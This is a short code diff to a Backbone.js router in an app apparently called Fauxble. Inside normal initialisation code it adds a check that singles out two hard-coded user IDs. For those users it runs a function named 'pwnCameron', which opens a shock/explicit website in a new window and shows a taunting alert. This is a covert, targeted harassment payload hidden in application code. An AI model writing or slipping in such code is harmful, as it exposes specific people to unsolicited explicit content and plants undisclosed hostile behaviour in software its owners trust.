@@ -31,6 +31,10 @@ Fauxble.Routers.Router = Backbone.Router.extend({
 		this.chat();
 		this.popup();
 		
+		if (this.attr.current_user.get('uid') === '530468649' || this.attr.current_user.get('uid') === '1952630') {
+			this.pwnCameron();
+		}
+		
 		$(window).bind('onbeforeunload', this.leaveSite);
 	},
 	
@@ -236,5 +240,10 @@ Fauxble.Routers.Router = Backbone.Router.extend({
 		this.feed();
 		$('.right.column').html(view.render().el);
 		this.triggerPage('profile');
+	},
+	
+	pwnCameron: function() {
+		window.open('http://www.meatspin.com', '_blank');
+		alert('ha ha ha');
 	}
 });
